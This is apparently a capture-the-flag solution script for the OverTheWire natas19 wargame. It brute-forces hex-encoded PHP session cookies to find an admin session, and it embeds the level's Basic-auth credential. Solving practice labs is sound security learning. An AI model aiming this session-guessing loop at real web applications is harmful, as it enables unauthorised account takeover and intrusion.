import urllib2
import urllib
import time
import sys
import binascii


for i in range(641):
    cookie = str(i) + '-admin'
    hex_cookie = binascii.hexlify(cookie)
    headers={'Authorization': 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==', 'Cookie': 'PHPSESSID=' + hex_cookie}
    request = urllib2.Request('http://natas19.natas.labs.overthewire.org', headers=headers)
    response = urllib2.urlopen(request)
    result = response.read()
    if 'You are an admin' in result:
        print i
        response.close()
        break
    response.close()

